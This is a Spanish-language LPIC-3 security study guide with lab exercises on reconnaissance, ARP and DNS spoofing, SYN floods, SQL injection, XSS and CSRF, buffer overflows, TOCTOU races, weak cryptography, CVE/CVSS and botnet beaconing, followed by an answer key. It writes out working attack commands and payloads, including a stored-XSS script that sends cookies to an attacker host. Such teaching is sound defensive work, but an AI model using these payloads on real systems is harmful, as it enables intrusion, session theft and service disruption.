# 335.1 Vulnerabilidades y Amenazas de Seguridad Comunes — Ejercicios Guiados

> **Examen:** LPIC-3 Security 303-300 (v3.0.0) · **Topic 335.1** · Peso en el examen: 3
> **Fuente del objetivo:** <https://www.lpi.org/our-certifications/exam-303-objectives/>

Estos ejercicios te guían a través de las clases de amenazas nombradas en el objetivo 335.1 — reconocimiento, suplantación de identidad, denegación de servicio, errores de programación, debilidades criptográficas — más botnets, CVE y CVSS. Cada bloque es una secuencia de pasos numerados que ejecutás, seguida de preguntas de comprensión. Las respuestas modelo están en la sección plegable al final.

---

## ⚠️ Aviso de autorización del laboratorio (leer antes del paso 1)

Toda técnica ofensiva a continuación es destructiva o ilegal cuando se dirige a sistemas que no poseés o para los que no tenés autorización escrita para probar. Escanear, falsificar (spoofing) e inundar (flooding) una red que no controlás es un delito en la mayoría de las jurisdicciones (por ejemplo, la Computer Fraud and Abuse Act de EE. UU., la Computer Misuse Act del Reino Unido, la Ley 26.388 de Argentina). Realizá todos los pasos dentro de un **laboratorio aislado que poseas**: una red virtual host-only o interna sin ruta hacia producción o Internet, o contenedores descartables en una sola máquina.

Topología de laboratorio recomendada usada a lo largo del documento:

```
                 host-only network 10.0.0.0/24 (no gateway to the outside)
   ┌───────────────┬───────────────────────────┬────────────────────────┐
   │ attacker      │ victim / target           │ observer (optional)     │
   │ 10.0.0.10     │ 10.0.0.20                  │ 10.0.0.30               │
   │ Kali/Debian   │ Debian + services + DVWA  │ Debian + tcpdump/Wireshark
   └───────────────┴───────────────────────────┴────────────────────────┘
```

Instalá el instrumental una sola vez en el nodo atacante:

```bash
sudo apt-get update
sudo apt-get install -y nmap hping3 dsniff ettercap-text-only tcpdump \
                        dnsutils gdb build-essential docker.io python3-pip
```

---

## Ejercicio 1 — Reconocimiento: escaneo activo y fingerprinting de servicios

**Objetivo:** Entender cómo un atacante mapea un objetivo antes de un ataque, y qué revela cada tipo de escaneo a nivel de paquete.

1. Desde el atacante (`10.0.0.10`), ejecutá un barrido rápido de descubrimiento de hosts de la subred del laboratorio (basado en ARP en un enlace local, así que todavía no se envía ningún TCP):

   ```bash
   sudo nmap -sn 10.0.0.0/24
   ```

   Esperado (abreviado):

   ```
   Nmap scan report for 10.0.0.20
   Host is up (0.00042s latency).
   MAC Address: 08:00:27:AB:CD:EF (Oracle VirtualBox virtual NIC)
   Nmap done: 256 IP addresses (2 hosts up) scanned in 2.05s
   ```

2. Ejecutá un **escaneo TCP SYN (half-open)** de los 1000 puertos principales del objetivo mientras capturás tráfico en el nodo observador. En el observador primero:

   ```bash
   sudo tcpdump -ni eth0 host 10.0.0.20 and 'tcp[tcpflags] & (tcp-syn|tcp-rst) != 0'
   ```

   Luego, en el atacante:

   ```bash
   sudo nmap -sS -Pn 10.0.0.20
   ```

3. Ejecutá un escaneo de **detección de servicio/versión y SO** y guardalo en todos los formatos:

   ```bash
   sudo nmap -sV -O -oA recon-10.0.0.20 10.0.0.20
   ```

   Esperado (abreviado):

   ```
   PORT    STATE SERVICE VERSION
   22/tcp  open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
   80/tcp  open  http    Apache httpd 2.4.57 ((Debian))
   3306/tcp open mysql   MySQL 8.0.36
   ```

4. Comparalo con un **escaneo TCP connect** (`-sT`) y un **escaneo UDP** de unos pocos puertos:

   ```bash
   sudo nmap -sT -p22,80 10.0.0.20
   sudo nmap -sU -p53,123,161 10.0.0.20
   ```

**Preguntas de comprensión**

- **Q1.** En el escaneo SYN, ¿cómo decide Nmap si un puerto está `open`, `closed` o `filtered`, y por qué se le llama "half-open"?
- **Q2.** ¿Cuál es la diferencia operativa entre `-sS` y `-sT`, y por qué `-sT` aparece más fácilmente en los logs de aplicación del objetivo?
- **Q3.** El escaneo UDP es mucho más lento y ruidoso por puerto. Explicá por qué `open|filtered` es un resultado tan común para los puertos UDP.
- **Q4.** El reconocimiento también incluye *ingeniería social*. Nombrá dos técnicas de ingeniería social y explicá por qué eluden todo control técnico del host objetivo.

---

## Ejercicio 2 — Suplantación de identidad: ARP spoofing y un man-in-the-middle

**Objetivo:** Ver cómo un ataque de capa 2 redirige tráfico a través del atacante, e identificar la defensa.

1. En la **víctima** (`10.0.0.20`), registrá el mapeo ARP actual del observador/gateway que vas a suplantar:

   ```bash
   ip neigh show
   # 10.0.0.30 dev eth0 lladdr 08:00:27:11:22:33 REACHABLE
   ```

2. En el **atacante**, habilitá el reenvío IPv4 para que el tráfico interceptado se siga entregando (de lo contrario causás un DoS, no un MITM):

   ```bash
   sudo sysctl -w net.ipv4.ip_forward=1
   ```

3. Envenená ambas direcciones para que el atacante se ubique entre la víctima y el observador:

   ```bash
   sudo arpspoof -i eth0 -t 10.0.0.20 10.0.0.30 &
   sudo arpspoof -i eth0 -t 10.0.0.30 10.0.0.20 &
   ```

4. En la víctima, volvé a revisar la tabla ARP — la MAC del objetivo ahora apunta al atacante:

   ```bash
   ip neigh show
   # 10.0.0.30 dev eth0 lladdr 08:00:27:AB:CD:EF REACHABLE   <-- attacker's MAC
   ```

5. En el atacante, capturá el tráfico redirigido y observá credenciales en texto plano si la víctima usa un protocolo sin cifrar (por ejemplo HTTP o FTP hacia un servicio del laboratorio):

   ```bash
   sudo tcpdump -ni eth0 -A 'host 10.0.0.20 and port 80'
   ```

6. Detené el ataque y dejá que las cachés se recuperen:

   ```bash
   sudo kill %1 %2
   ```

**Preguntas de comprensión**

- **Q5.** ARP no tiene autenticación. Explicá el comportamiento exacto del protocolo que hace que una *respuesta ARP gratuita (gratuitous ARP reply)* envenene la caché de una víctima aunque la víctima nunca la haya solicitado.
- **Q6.** ¿Por qué `net.ipv4.ip_forward=1` es la diferencia entre un MITM y una denegación de servicio accidental?
- **Q7.** La víctima estaba usando HTTPS hacia un sitio distinto y solo viste texto cifrado. ¿Qué debe agregar un atacante a un MITM para degradar o interceptar TLS, y qué mecanismo del navegador/HSTS lo derrota?
- **Q8.** Nombrá una mitigación a nivel de switch y una a nivel de host contra el ARP spoofing.

---

## Ejercicio 3 — Suplantación de identidad: DNS spoofing / envenenamiento de caché

**Objetivo:** Redirigir una resolución de nombre a una dirección controlada por el atacante, sobre la posición MITM del Ejercicio 2.

1. En el atacante, creá una tabla de DNS spoofing de ettercap que mapee un dominio del laboratorio a tu dirección:

   ```bash
   echo 'intranet.lab   A   10.0.0.10' | sudo tee /etc/ettercap/etter.dns
   ```

2. Lanzá ettercap en modo texto con el plugin de DNS, apuntando a la víctima y al resolutor del laboratorio:

   ```bash
   sudo ettercap -T -q -i eth0 -P dns_spoof -M arp:remote /10.0.0.20// /10.0.0.30//
   ```

3. En la víctima, resolvé el nombre y confirmá que ahora devuelve al atacante:

   ```bash
   dig +short intranet.lab @10.0.0.30
   # 10.0.0.10
   ```

4. Contrastalo con un experimento mental de **envenenamiento de caché remoto**: en cualquier resolutor, inspeccioná si la validación DNSSEC está habilitada (la defensa real):

   ```bash
   dig +dnssec +multiline example.com. SOA
   # look for the 'ad' flag in the header and RRSIG records
   ```

**Preguntas de comprensión**

- **Q9.** En el ataque LAN falsificaste la *respuesta* porque estabas on-path. El envenenamiento remoto estilo Kaminsky no necesita acceso on-path — ¿qué dos campos debe adivinar el atacante off-path antes de que llegue la respuesta legítima, y qué hizo práctico el ataque de 2008?
- **Q10.** ¿Cómo elevan la barrera la aleatorización del puerto de origen *y* DNSSEC cada una, y cuál provee protección criptográfica (no solo probabilística)?

---

## Ejercicio 4 — Denegación de servicio: SYN flood y SYN cookies

**Objetivo:** Agotar la tabla de conexiones half-open de un objetivo, luego defenderse con SYN cookies.

1. En la **víctima**, **deshabilitá** temporalmente las SYN cookies y reducí el backlog para que el efecto se vea rápido (solo en laboratorio — revertí después):

   ```bash
   sudo sysctl -w net.ipv4.tcp_syncookies=0
   sudo sysctl -w net.ipv4.tcp_max_syn_backlog=128
   ```

2. Iniciá un servicio en escucha y un monitor en la víctima:

   ```bash
   sudo ss -ntl 'sport = :80'      # baseline
   watch -n1 "ss -n state syn-recv | wc -l"
   ```

3. Desde el atacante, lanzá un SYN flood con direcciones de origen aleatorias falsificadas:

   ```bash
   sudo hping3 -S --flood --rand-source -p 80 10.0.0.20
   ```

4. En la víctima, observá cómo la cuenta de `SYN-RECV` sube hacia el límite del backlog y observá cómo los clientes legítimos expiran por timeout:

   ```bash
   # attacker's legitimate second terminal:
   curl --max-time 3 http://10.0.0.20/    # now hangs / times out
   ```

5. Detené el flood (`Ctrl-C`), luego **habilitá las SYN cookies** y repetí el paso 3:

   ```bash
   sudo sysctl -w net.ipv4.tcp_syncookies=1
   ```

   Observá en `dmesg`:

   ```
   TCP: request_sock_TCP: Possible SYN flooding on port 80. Sending cookies.
   ```

6. Restaurá los valores por defecto razonables:

   ```bash
   sudo sysctl -w net.ipv4.tcp_syncookies=1
   sudo sysctl -w net.ipv4.tcp_max_syn_backlog=1024
   ```

**Preguntas de comprensión**

- **Q11.** Describí el three-way handshake y señalá exactamente en qué estado quedan atascadas las entradas half-open durante el flood.
- **Q12.** ¿Cómo permiten las SYN cookies que el servidor acepte una conexión *sin* almacenar estado para la entrada half-open? ¿Qué información se codifica en el número de secuencia inicial?
- **Q13.** ¿Cuál es el costo/limitación práctica de las SYN cookies (pista: pensá en opciones TCP como window scaling y SACK)?
- **Q14.** El SYN flood es *cuasi-volumétrico pero en realidad de agotamiento de estado*. Contrastalo con un ataque de **amplificación/reflexión** (por ejemplo DNS o NTP `monlist`): ¿qué hace que la reflexión produzca mucho más tráfico de ataque del que envía el atacante, y por qué también oculta al atacante?

---

## Ejercicio 5 — Errores de programación: inyección SQL

**Objetivo:** Explotar y luego entender consultas no parametrizadas usando la deliberadamente vulnerable DVWA.

1. En la **víctima**, ejecutá DVWA en un contenedor y configurá la seguridad en "low" desde la interfaz web (`http://10.0.0.20/`):

   ```bash
   sudo docker run --rm -d -p 80:80 --name dvwa vulnerables/web-dvwa
   ```

2. En el módulo "SQL Injection", enviá un ID normal (`1`) y observá que la consulta devuelve un usuario. Luego enviá una tautología clásica en el campo `id`:

   ```
   1' OR '1'='1
   ```

   Se devuelven todas las filas.

3. Enumerá la cantidad de columnas con `ORDER BY`, luego extraé datos con un `UNION`:

   ```
   1' ORDER BY 2 -- -
   1' UNION SELECT user, password FROM users -- -
   ```

   Las contraseñas hasheadas de la tabla `users` se vuelcan en la página.

4. Automatizá el mismo hallazgo para ver cómo un escáner lo confirma (todavía solo contra tu laboratorio):

   ```bash
   sqlmap -u "http://10.0.0.20/vulnerabilities/sqli/?id=1&Submit=Submit" \
          --cookie="PHPSESSID=<yours>; security=low" --batch --dbs
   ```

5. Cambiá DVWA a seguridad "high" e inspeccioná el diff del código fuente (la app ahora usa una **prepared statement** / consulta parametrizada). Reintentá la tautología — falla.

**Preguntas de comprensión**

- **Q15.** Explicá con precisión por qué `1' OR '1'='1` cambia el significado de la sentencia SQL. Mostrá en qué se convierte la consulta concatenada.
- **Q16.** ¿Por qué una *sentencia parametrizada/prepared statement* detiene esta clase de ataque de raíz, y por qué el escapado/blacklisting de la entrada es una defensa inferior?
- **Q17.** El `UNION SELECT` necesitaba la cantidad correcta de columnas. ¿Por qué, y cómo la descubre un atacante a ciegas (sin mensajes de error)?
- **Q18.** ¿Cuál es el principio de *menor privilegio* para la cuenta de base de datos acá, y cómo habría limitado el radio de impacto incluso con el bug presente?

---

## Ejercicio 6 — Errores de programación: Cross-Site Scripting (XSS) y CSRF

**Objetivo:** Distinguir XSS reflejado vs almacenado, y ver por qué CSRF es un bug diferente aunque ambos vivan en el navegador.

1. En DVWA (low), abrí "XSS (Reflected)". Enviá en el campo de nombre:

   ```html
   <script>alert(document.cookie)</script>
   ```

   El script se ejecuta en tu sesión — el payload fue reflejado sin escapar en la respuesta.

2. Abrí "XSS (Stored)", publicá un mensaje en el libro de visitas que contenga:

   ```html
   <script>new Image().src='http://10.0.0.10/steal?c='+document.cookie</script>
   ```

   En el atacante, ejecutá un listener y observá cómo llega la cookie de la víctima cuando *cualquiera* ve la página:

   ```bash
   python3 -m http.server 80
   # 10.0.0.20 - - "GET /steal?c=PHPSESSID=... HTTP/1.1" 404
   ```

3. Abrí "CSRF" (módulo de cambio de contraseña). Alojá un formulario malicioso de auto-envío en el atacante y navegá a él mientras estás con sesión iniciada en DVWA:

   ```html
   <body onload="document.forms[0].submit()">
     <form action="http://10.0.0.20/vulnerabilities/csrf/"
           method="GET">
       <input type="hidden" name="password_new" value="pwned">
       <input type="hidden" name="password_conf" value="pwned">
       <input type="hidden" name="Change" value="Change">
     </form>
   </body>
   ```

4. Confirmá que la contraseña cambió *sin* la intención de la víctima, luego cambiá DVWA a "high" y observá el **token** anti-CSRF (`user_token`) ahora requerido.

**Preguntas de comprensión**

- **Q19.** XSS reflejado vs almacenado: ¿dónde vive el payload en cada uno, y por qué el XSS almacenado es generalmente más severo?
- **Q20.** Enunciá las dos defensas del lado de la salida (codificación de salida sensible al contexto y Content-Security-Policy) y el único flag de cookie (`HttpOnly`) que habrían mitigado cada uno el paso 2.
- **Q21.** CSRF y XSS ambos se ejecutan en el navegador de la víctima. Explicá la diferencia central: ¿qué abusa CSRF que XSS no necesita? ¿Por qué un token anti-CSRF por solicitud lo derrota pero `HttpOnly` no?
- **Q22.** ¿Cómo se relaciona el atributo de cookie `SameSite` con CSRF, y qué cambia `SameSite=Lax` vs `Strict`?

---

## Ejercicio 7 — Errores de programación: buffer overflow y condiciones de carrera

**Objetivo:** Observar bugs de seguridad de memoria y de time-of-check/time-of-use, y las mitigaciones que los neutralizan.

**Parte A — Buffer overflow de pila (demostración conceptual)**

1. Escribí un programa deliberadamente vulnerable y compilalo con las protecciones modernas **apagadas** para que el mecanismo sea visible:

   ```c
   /* vuln.c */
   #include <stdio.h>
   #include <string.h>
   void win(void){ puts("control flow hijacked"); }
   void greet(char *s){ char buf[64]; strcpy(buf, s); printf("hi %s\n", buf); }
   int main(int argc, char **argv){ greet(argv[1]); return 0; }
   ```

   ```bash
   gcc -g -O0 -fno-stack-protector -z execstack -no-pie vuln.c -o vuln
   ```

2. Provocá un crash desbordando el buffer de 64 bytes, e inspeccioná la dirección de retorno guardada corrompida en gdb:

   ```bash
   ./vuln $(python3 -c 'print("A"*80)')        # Segmentation fault
   gdb -q --args ./vuln $(python3 -c 'print("A"*80)')
   (gdb) run
   (gdb) info registers rip      # shows 0x4141414141410000-ish
   ```

3. Ahora recompilá con las defensas **encendidas** (los valores por defecto de la distro) y repetí:

   ```bash
   gcc -g -O0 -fstack-protector-strong -fPIE -pie vuln.c -o vuln_safe
   ./vuln_safe $(python3 -c 'print("A"*80)')
   # *** stack smashing detected ***: terminated  → Aborted
   ```

**Parte B — Condición de carrera TOCTOU**

4. Reproducí una carrera de time-of-check/time-of-use con un intercambio de symlink contra un patrón ingenuo de "check then write":

   ```bash
   # naive victim script (runs as a privileged user):
   f=/tmp/report.$$; [ -e "$f" ] || echo "data" > "$f"

   # attacker loop, racing to plant a symlink between the check and the write:
   while :; do ln -sf /etc/passwd /tmp/report.12345 2>/dev/null; done
   ```

**Preguntas de comprensión**

- **Q23.** En la Parte A, ¿qué sobrescribieron exactamente los 80 bytes para terminar en `RIP`, y por qué eso le da a un atacante el control de la ejecución?
- **Q24.** Nombrá las tres mitigaciones que activaste o que provee el SO — stack canary (`-fstack-protector`), ASLR/PIE, y NX/DEP (`execstack`) — y decí qué previene específicamente cada una.
- **Q25.** En la Parte B, ¿cuáles son el "check" y el "use", y por qué el intervalo entre ellos crea la vulnerabilidad? Dá la corrección adecuada (operación atómica) que elimina la ventana.

---

## Ejercicio 8 — Debilidades criptográficas

**Objetivo:** Reconocer primitivas débiles y mal uso de protocolos sin necesidad de romper criptografía real.

1. Demostrá por qué los hashes rápidos y sin salt son débiles. Hasheá una contraseña común con MD5 y observá una salida propensa a colisiones y vulnerable a diccionario:

   ```bash
   echo -n "password" | md5sum
   # 5f4dcc3b5aa765d61d8327deb882cf99   (instantly reversible via any rainbow table)
   ```

2. Inspeccioná el TLS de un servidor en busca de versiones de protocolo y suites de cifrado obsoletas (contra tu servicio HTTPS de laboratorio):

   ```bash
   nmap --script ssl-enum-ciphers -p 443 10.0.0.20
   # flags: TLSv1.0 / SSLv3 offered, RC4, 3DES, or NULL/EXPORT ciphers  → weak (grade F)
   ```

3. Mostrá por qué el modo ECB filtra estructura — cifrá un bitmap con `aes-128-ecb` y miralo: bloques de texto plano idénticos producen bloques de texto cifrado idénticos (el clásico "pingüino ECB").

   ```bash
   openssl enc -aes-128-ecb -in tux.bmp -out tux.ecb -K 00112233445566778899aabbccddeeff -nosalt
   ```

**Preguntas de comprensión**

- **Q26.** ¿Por qué MD5 y SHA-1 son inadecuados tanto como hashes de contraseña *como* para firmas digitales — y son las dos razones la misma? (Distinguí velocidad/salting de resistencia a colisiones.)
- **Q27.** Explicá el "pingüino ECB": ¿por qué ECB revela patrones del texto plano, y qué propiedad agregan CBC/GCM para prevenirlo?
- **Q28.** Nombrá dos ataques con nombre de la era TLS (por ejemplo POODLE, BEAST, Heartbleed, ROBOT) y, para uno, si fue una falla de *protocolo/modo* o una falla de *implementación*.

---

## Ejercicio 9 — CVE y CVSS

**Objetivo:** Usar el vocabulario de la industria para rastrear y priorizar vulnerabilidades.

1. Buscá un CVE bien conocido y leé su registro autoritativo (fuente: MITRE `cve.org` y NVD):

   ```bash
   # Log4Shell
   curl -s https://cveawg.mitre.org/api/cve/CVE-2021-44228 | jq '.containers.cna.descriptions[0].value'
   ```

   Luego abrí la entrada de NVD: <https://nvd.nist.gov/vuln/detail/CVE-2021-44228>

2. Leé el **vector CVSS v3.1** en esa página de NVD:

   ```
   CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H   → Base score 10.0 (Critical)
   ```

3. Decodificá el vector a mano, luego verificalo con la calculadora oficial de FIRST: <https://www.first.org/cvss/calculator/3.1>

4. Escaneá tu host de laboratorio en busca de CVEs conocidos con un escáner capaz de trabajar offline:

   ```bash
   # Container/image example:
   trivy image vulnerables/web-dvwa
   # or OS package audit on Debian:
   sudo apt-get install -y debsecan && debsecan --suite bookworm
   ```

**Preguntas de comprensión**

- **Q29.** ¿Qué es un identificador CVE, quién lo asigna (el modelo CNA), y qué *no* incluye deliberadamente un registro CVE?
- **Q30.** Decodificá `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`: ¿qué significa cada métrica y por qué `S:C` (scope changed) empuja el puntaje al máximo?
- **Q31.** Distinguí los grupos de métricas CVSS **Base**, **Temporal/Threat** y **Environmental**. ¿Por qué un puntaje Base por sí solo es una mala manera de priorizar el parcheo en tu propio entorno?
- **Q32.** ¿Cómo complementan EPSS y CISA KEV a CVSS para la priorización en el mundo real?

---

## Ejercicio 10 — Botnets y command-and-control

**Objetivo:** Entender cómo se organizan los hosts comprometidos y cómo se detecta su tráfico C2 (solo detección — sin malware).

1. Modelá el ciclo de vida: infección → rendezvous C2 → asignación de tareas → acción (DDoS, spam, minería de criptomonedas). Simulá un beacon *benigno* desde la víctima para visualizar el patrón — una llamada de retorno regular y de baja fluctuación (jitter):

   ```bash
   # benign stand-in for a beacon (victim → attacker every 30s):
   while :; do curl -s -m2 http://10.0.0.10/checkin >/dev/null; sleep 30; done
   ```

2. En el observador, detectá la periodicidad que delata el beaconing automatizado en lugar de la navegación humana:

   ```bash
   sudo tcpdump -ni eth0 'host 10.0.0.10 and tcp[tcpflags] & tcp-syn != 0' -tttt
   # note the near-constant inter-arrival time between connections
   ```

3. Discutí las señales de detección: temporización regular, dominios generados por DGA, conexiones a dominios recién registrados, y volumen de DNS saliente. Inspeccioná el volumen de consultas DNS:

   ```bash
   sudo tcpdump -ni eth0 udp port 53 | awk '{print $NF}' | sort | uniq -c | sort -rn | head
   ```

**Preguntas de comprensión**

- **Q33.** Contrastá una botnet *centralizada* (IRC/HTTP con un único C2) con una botnet *peer-to-peer*: ¿qué gana P2P en resiliencia y qué pierde el defensor?
- **Q34.** ¿Qué es un Domain Generation Algorithm (DGA), y por qué derrota las listas de bloqueo estáticas de IP/dominio? ¿Qué enfoque de detección todavía funciona contra él?
- **Q35.** Dá dos indicadores a nivel de red y uno a nivel de host de que una máquina de tu flota se ha unido a una botnet.

---

<details>
<summary><strong>Clave de respuestas (clic para expandir)</strong></summary>

**Q1.** Nmap envía un único `SYN`. Un `SYN/ACK` de vuelta ⇒ **open** (Nmap entonces envía `RST` para desarmar antes de completar el handshake — de ahí *half-open*). Un `RST` de vuelta ⇒ **closed**. Sin respuesta tras las retransmisiones, o un ICMP unreachable (tipo 3, código 1/2/3/9/10/13) ⇒ **filtered** (un firewall lo descartó). Nunca completa el tercer `ACK`, así que no se establece una conexión completa.

**Q2.** `-sS` fabrica paquetes crudos (raw) y nunca termina el handshake, por lo que el kernel/aplicación del objetivo nunca ve un socket completado → típicamente ninguna entrada en el log de aplicación (requiere root/`CAP_NET_RAW`). `-sT` llama al `connect()` del SO, completando el three-way handshake completo, así que la aplicación del objetivo hace `accept()` y registra una conexión (y funciona sin privilegios de raw-socket). `-sT` es por lo tanto más ruidoso y aparece en los logs de web/SSH.

**Q3.** UDP es sin conexión (connectionless): un puerto abierto normalmente no devuelve *nada* (la aplicación puede o no responder), y un puerto cerrado devuelve un ICMP port-unreachable — pero los hosts **limitan la tasa (rate-limit)** de ICMP, así que la ausencia de respuesta es ambigua entre "open" y "descartado por un filtro". Nmap reporta `open|filtered` cuando no obtiene datos ni error ICMP. La lentitud viene de esperar a que expiren los timeouts y los límites de tasa de ICMP por puerto.

**Q4.** Ejemplos: **phishing/spear-phishing** (email/mensaje engañoso que recolecta credenciales), **pretexting** (inventar un escenario para extraer información), **baiting** (USB abandonado), **tailgating** (piggybacking físico). Apuntan al *humano*, que tiene credenciales y acceso legítimos, así que no interviene ningún firewall, nivel de parcheo o IDS del host — al atacante se le entrega acceso válido en lugar de romper un control técnico.

**Q5.** ARP es sin estado (stateless) y sin autenticación. Un host acepta y cachea cualquier respuesta ARP (o anuncio gratuitous ARP) que vea en el cable, sobrescribiendo la entrada IP→MAC existente, sin haber enviado una solicitud correspondiente. El atacante difunde "10.0.0.30 está en *mi* MAC"; la víctima actualiza ciegamente su caché y empieza a enviar el tráfico del observador al atacante.

**Q6.** Con el reenvío **apagado**, los paquetes destinados al host real llegan al atacante y se descartan → la víctima pierde conectividad (una denegación de servicio, y el ataque es obvio). Con `ip_forward=1`, el atacante retransmite los paquetes al destino verdadero luego de inspeccionarlos/alterarlos, así que la comunicación continúa normalmente y la interceptación es transparente — la definición de un MITM.

**Q7.** El atacante debe terminar TLS él mismo — presentar un certificado en el que la víctima confíe (mediante una CA fraudulenta/instalada, `sslsplit`/`mitmproxy`, o una degradación de SSL-stripping a HTTP). Derrotado por **HSTS** (el navegador rechaza HTTP plano y se niega a hacer clic para pasar las advertencias de certificado para ese dominio), certificate pinning, y HSTS preloading, que previenen tanto el stripping como la aceptación de certificados fraudulentos.

**Q8.** A nivel de switch: **Dynamic ARP Inspection (DAI)** respaldado por DHCP snooping, o vinculaciones estáticas/sticky de puerto-MAC. A nivel de host: **entradas ARP estáticas** para pares críticos (gateway), o un demonio ARP-watch (`arpwatch`) que alerta ante cambios de MAC. (802.1X/port security también limita quién puede estar en el segmento.)

**Q9.** El atacante off-path debe adivinar el **ID de transacción DNS de 16 bits** *y* el **puerto de origen UDP** de la consulta del resolutor, y ganar la carrera contra la respuesta autoritativa real. Kaminsky (2008) lo hizo práctico al forzar muchas consultas por subdominios inexistentes (para que el fallo de caché siga repitiéndose) y envenenar los registros *NS/glue* de toda la zona en lugar de un registro — eliminando la limitación de "esperar a que expire el TTL" y dando muchos intentos de adivinación en paralelo.

**Q10.** La **aleatorización del puerto de origen** agrega ~16 bits de entropía sobre el ID de transacción, convirtiendo una adivinación factible en ~2³² intentos — una defensa *probabilística* que solo eleva el costo. **DNSSEC** firma los registros con una cadena de confianza (RRSIG/DNSKEY/DS); un resolutor validador rechaza cualquier respuesta falsificada porque falla la verificación de firma — protección *criptográfica*, no probabilística (integridad/autenticidad, aunque no confidencialidad).

**Q11.** (1) Cliente → `SYN`; (2) el servidor asigna una entrada half-open y responde `SYN/ACK`; (3) cliente → `ACK`, la conexión pasa a ESTABLISHED. Durante el flood, el origen falsificado nunca envía el tercer `ACK`, así que las entradas se acumulan en el estado **`SYN-RECV`** hasta que la cola de `tcp_max_syn_backlog` se llena y los nuevos `SYN` legítimos se descartan.

**Q12.** Con las SYN cookies el servidor envía `SYN/ACK` **sin almacenar ningún estado**: codifica los parámetros de la conexión en el número de secuencia inicial (ISN) — un hash criptográfico de la 4-tupla, un timestamp/contador que cambia lentamente, y el MSS. Cuando el `ACK` del cliente vuelve, `ack-1` transporta ese ISN de regreso; el servidor recalcula el hash, lo valida, y reconstruye el estado de la conexión sobre la marcha. No se necesita ninguna entrada en la tabla `SYN-RECV`, así que el backlog no puede agotarse.

**Q13.** El ISN tiene bits limitados, así que solo puede codificarse un MSS grueso y otras opciones TCP negociadas en el `SYN` original (window scaling, SACK, timestamps) normalmente se **pierden/limitan** cuando las cookies entran en acción — perjudicando el rendimiento en enlaces de alta latencia o alto ancho de banda. Las cookies son por lo tanto un mecanismo de reserva que se activa solo bajo ataque, no un reemplazo permanente del backlog.

**Q14.** En un ataque de **reflexión/amplificación**, el atacante envía pequeñas solicitudes falsificadas (con la IP de origen de la *víctima*) a muchos servidores mal configurados; cada servidor envía una respuesta mucho más grande a la víctima (DNS ANY ~50×, NTP `monlist` ~500×, memcached miles×). El **factor de amplificación** multiplica el ancho de banda, y la falsificación del origen significa que la víctima ve tráfico proveniente de miles de reflectores legítimos, ocultando al atacante real. El SYN flood, en cambio, apunta al *estado* (el backlog), no al ancho de banda bruto.

**Q15.** La app construye `SELECT ... WHERE id = '$id'`. Inyectar `1' OR '1'='1` produce `... WHERE id = '1' OR '1'='1'`. El `'` final cierra el literal previsto, `OR '1'='1'` siempre es verdadero, así que el `WHERE` coincide con todas las filas — el atacante cambió la *lógica* de la consulta, no solo sus datos.

**Q16.** Una prepared statement envía la estructura SQL a la base de datos *primero* y vincula la entrada del usuario como **parámetros de datos**, así que la entrada nunca puede parsearse como sintaxis SQL — el punto de inyección se cierra a nivel del parser. El escapado/blacklisting es inferior porque es una lista de exclusión que persigue cada codificación, estilo de comillas y peculiaridad del DBMS; un solo caso pasado por alto (o un contexto numérico sin comillas) reabre el agujero.

**Q17.** Un `UNION SELECT` debe tener la **misma cantidad de columnas** que la consulta original o da error. A ciegas, el atacante usa `ORDER BY n` (aumentando `n` hasta que da error, revelando la cantidad de columnas) o `UNION SELECT NULL,NULL,...` (agregando NULLs hasta que funciona), luego coloca datos extraíbles en las columnas que se renderizan.

**Q18.** La cuenta de BD que usa la app debería tener solo los privilegios que necesita (por ejemplo `SELECT/INSERT/UPDATE` sobre su propio esquema, **no** `DROP`, `FILE`, acceso a `mysql.user`, u otras bases de datos). Con menor privilegio, incluso una inyección funcional no podría leer otros esquemas, escribir archivos (`INTO OUTFILE`), o eliminar tablas — limitando el radio de impacto.

**Q19.** XSS reflejado: el payload está en la **solicitud** (URL/formulario) y se refleja de vuelta en la respuesta inmediata — debe entregarse por víctima (por ejemplo un enlace manipulado). XSS almacenado: el payload se **persiste del lado del servidor** (BD, comentario, perfil) y se sirve a *cada* espectador automáticamente — más severo porque se autopropaga a todos los usuarios, incluidos los administradores, sin un señuelo.

**Q20.** **Codificación de salida sensible al contexto** (HTML-encode `<>&"'` para que el payload se renderice como texto, no como marcado). **Content-Security-Policy** (prohibir scripts en línea / restringir las fuentes de scripts, para que un `<script>` inyectado no se ejecute). **`HttpOnly`** en la cookie de sesión para que `document.cookie` no pueda leerla, derrotando el robo de cookie del paso 2.

**Q21.** XSS ejecuta *script provisto por el atacante* en el origen de la víctima. CSRF no inyecta **ningún script**; abusa de la vinculación automática del navegador de las **credenciales ambientales** de la víctima (la cookie de sesión) a una solicitud cross-site falsificada, así que el servidor no puede distinguir que no fue iniciada por el usuario. Un **token anti-CSRF** por solicitud lo derrota porque la página off-origin del atacante no puede leer el token impredecible para incluirlo. `HttpOnly` *no* ayuda — el navegador de todos modos *envía* la cookie automáticamente; `HttpOnly` solo impide que JavaScript la *lea*.

**Q22.** `SameSite` le dice al navegador si adjuntar la cookie en solicitudes cross-site. `SameSite=Strict` la retiene en *todas* las navegaciones cross-site (defensa CSRF fuerte, pero rompe los enlaces entrantes a páginas con sesión iniciada); `SameSite=Lax` (el valor por defecto moderno) la envía en navegaciones GET de nivel superior pero no en solicitudes POST/subrecurso cross-site — bloqueando la mayoría de los CSRF mientras preserva la usabilidad.

**Q23.** `strcpy` copió 80 bytes en un `buf` de 64 bytes, desbordando más allá del buffer, más allá del puntero base guardado, hacia la **dirección de retorno guardada** en la pila. Cuando `greet` ejecuta `ret`, la CPU saca (pop) ese valor sobrescrito hacia `RIP` (`0x4141...`), así que el atacante controla la dirección de la próxima instrucción — redirigiendo la ejecución (por ejemplo a `win()` o a shellcode inyectado).

**Q24.** **Stack canary** (`-fstack-protector`): un valor de guarda aleatorio colocado antes de la dirección de retorno guardada y verificado a la salida de la función; un desbordamiento lineal lo corrompe → "stack smashing detected", abortando antes del `ret`. **ASLR + PIE**: aleatoriza las direcciones base de pila/heap/bibliotecas/ejecutable, así que el atacante no puede predecir de forma confiable a dónde saltar. **NX/DEP** (sin `execstack`): marca la pila como no ejecutable, así que el shellcode inyectado en la pila no puede ejecutarse (forzando ROP/ret2libc en su lugar). Juntos convierten un desbordamiento trivial en un exploit difícil, y a menudo derrotado.

